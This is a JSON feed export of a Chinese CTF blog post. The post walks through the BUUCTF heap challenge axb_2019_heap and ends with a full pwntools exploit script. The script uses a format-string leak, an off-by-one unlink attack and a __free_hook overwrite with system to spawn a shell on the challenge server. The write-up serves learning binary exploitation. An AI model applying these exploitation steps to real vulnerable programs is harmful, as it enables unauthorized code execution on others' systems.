{
    "version": "https://jsonfeed.org/version/1",
    "title": "-NIYAH- • All posts by \"unlink\" tag",
    "description": "Niyah",
    "home_page_url": "http://niyah.cn",
    "items": [
        {
            "id": "http://niyah.cn/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/",
            "url": "http://niyah.cn/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/",
            "title": "记一道Unlink",
            "date_published": "2021-04-02T14:10:27.000Z",
            "content_html": "<blockquote>\n<p>unlink</p>\n</blockquote>\n<a id=\"more\"></a>\n<h1 id=\"axb_2019_heap\"><a class=\"markdownIt-Anchor\" href=\"#axb_2019_heap\">#</a> axb_2019_heap</h1>\n<h2 id=\"初探\"><a class=\"markdownIt-Anchor\" href=\"#初探\">#</a> 初探</h2>\n<p>保护全开，特别哈人</p>\n<center><img src=\"/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/1.png\"></center>\n<p>接下来打开 IDA 康康，可以发现开始有一个格式化字符串漏洞，那么我们可以用格式化字符串泄露栈上的值，那么我们最好是可以通过这个泄露出开 PIE 后的基地址和 libc 的基地址，这样就方便后面的操作</p>\n<center><img src=\"/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/2.png\"></center>\n<p>输入函数存在可以溢出一个字节存在 off-by-one~~，既然存在 off-by-one 那么理应是有几种利用方法的，但我觉得 Unlink 更加 OK（~~</p>\n<center><img src=\"/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/3.png\"></center>\n<h2 id=\"泄露地址\"><a class=\"markdownIt-Anchor\" href=\"#泄露地址\">#</a> 泄露地址</h2>\n<p>我们在利用格式化字符串进行泄露时，我们可以动态调试一下，去看看栈上有哪些可以利用的地方，并且格式化字符串也并不是一次只能泄露出一个地址，我们可以贪心地把我们需要的栈上变量都泄露出来</p>\n<p>这里我们寻找栈上的变量直接发现第 10 个和第 14 个就是我们需要泄露的数据，（当然这里也可以找别的，只要能算出来就行…），又由于 64 位传参，前 6 个参数不在栈上所以是 10 + 6-1 和 14 + 6-1 为什么 - 1 懂的都懂</p>\n<blockquote>\n<p>%15$p,%19$p</p>\n</blockquote>\n<center><img src=\"/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/4.png\"></center>\n<p>泄露之后我们就可以把开 PIE 后的基地址算出来，最后把指针数组的地址算出来就可以进行下一步利用了；</p>\n<h2 id=\"unlink\"><a class=\"markdownIt-Anchor\" href=\"#unlink\">#</a> Unlink</h2>\n<ol>\n<li>\n<p>我们先申请 4 个堆块，既然要造成 Unlink<sup class=\"footnote-ref\"><a href=\"#fn1\" id=\"fnref1\">[1]</a></sup>，那么 free 的那个大小应该至少属于 unsortedbin，大小大于 0x88 就可以，这里我们申请 0x98 大小的堆块，刚好就可以溢出到下一个堆块的 size 位</p>\n</li>\n<li>\n<p>改写一个 unsortedbin 之前的堆块，伪造出<kbd>fake_chunk</kbd>的结构（在一个正常堆块里伪造出一个 bin 结构）</p>\n</li>\n</ol>\n<blockquote>\n<p>提一嘴为什么是 ptr-0x8，因为我首先 malloc 了一个 chunk 没用它，其后我们要找一个指针指向我们的第二个 chunk 的数据段，当然就应该找数组存放的第二个指针了，用这个指针构造出一前一后两个 chunk 和<kbd>fake_chunk</kbd>相互 link 的假象，那么再释放第三个 chunk 时就会触发 Unlink，让其和前一个<kbd>fake_chunk</kbd>合并，合并的时候<kbd>fake_chunk</kbd>和数组 chunk 解连接，让数组的一个指针指向自己，完成 unlink</p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"></th>\n<th style=\"text-align:center\">0xA1</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">pre_size=0</td>\n<td style=\"text-align:center\">size=0x80</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">fd=ptr-0x8</td>\n<td style=\"text-align:center\">bk=ptr</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">…</td>\n<td style=\"text-align:center\">…</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">0x80</td>\n<td style=\"text-align:center\">0xa0</td>\n</tr>\n</tbody>\n</table>\n<ol start=\"3\">\n<li>删除第三个堆块，让触发 unlink，这里数组的第二个指针指向了数组地址 - 0x8 位置</li>\n</ol>\n<center><img src=\"/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/5.png\"></center>\n<h2 id=\"getshell\"><a class=\"markdownIt-Anchor\" href=\"#getshell\">#</a> Getshell</h2>\n<ol>\n<li>修改<kbd>free_hook</kbd>成为<kbd>system</kbd>函数的地址，<s>这题保护全开只能改<kbd>free_hook</kbd>，不然还可以改 atoi 函数</s></li>\n<li>删除第四个块，执行 system (&quot;/bin/sh&quot;) 成功 getshell</li>\n</ol>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h2>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#coding=utf-8</span>\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\nlibc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./libc/libc-2.23.so\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#p = process(\"./axb_2019_heap\")</span>\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">\"debug\"</span>\np <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node3.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">26984</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n    pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">choice</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tp<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>text<span class=\"token operator\">=</span><span class=\"token string\">\"aaaa\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tchoice<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\tp<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tp<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tp<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tchoice<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\tp<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>text<span class=\"token operator\">=</span><span class=\"token string\">\"aaaa\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tchoice<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n\tp<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tp<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#gdb.attach(p)</span>\n<span class=\"token comment\">#格式化字符串漏洞利用</span>\np<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Enter your name: \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"%15$p,%19$p\"</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello, \"</span><span class=\"token punctuation\">)</span>\nlibc_start_main <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x7fcd46b5f830\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">240</span>\nlibc_base <span class=\"token operator\">=</span> libc_start_main <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"__libc_start_main\"</span><span class=\"token punctuation\">]</span>\n\nlog<span class=\"token punctuation\">.</span>warn<span class=\"token punctuation\">(</span><span class=\"token string\">\"libc_start_main: \"</span><span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\",\"</span><span class=\"token punctuation\">)</span>\nbase <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x7fcd46b5f830\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">0x116a</span>\nlog<span class=\"token punctuation\">.</span>warn<span class=\"token punctuation\">(</span><span class=\"token string\">\"base: \"</span><span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nnote_addr <span class=\"token operator\">=</span> arry <span class=\"token operator\">=</span> <span class=\"token number\">0x202060</span> <span class=\"token operator\">+</span> base\nfree_hook <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"__free_hook\"</span><span class=\"token punctuation\">]</span>\nsystem_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span>\n\nlog<span class=\"token punctuation\">.</span>warn<span class=\"token punctuation\">(</span><span class=\"token string\">\"note_addr: \"</span><span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>note_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x98</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span><span class=\"token string\">'/bin/sh\\x00\\n'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#unlink</span>\npayload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>note_addr<span class=\"token operator\">-</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>note_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"\\x00\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x70</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\xa0\"</span>\n\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#getshell</span>\npayload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>free_hook<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>payload<span class=\"token operator\">+</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#dbg()</span>\n\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>system_addr<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"\\n\"</span> <span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<hr class=\"footnotes-sep\">\n<section class=\"footnotes\">\n<ol class=\"footnotes-list\">\n<li id=\"fn1\" class=\"footnote-item\"><p><a href=\"https://blog.csdn.net/qq_41202237/article/details/108481889\">一篇博客弄懂 Unlink</a> <a href=\"#fnref1\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n</ol>\n</section>\n",
            "tags": [
                "PWN",
                "格式化字符串",
                "堆",
                "BUUCTF",
                "unlink"
            ]
        }
    ]
}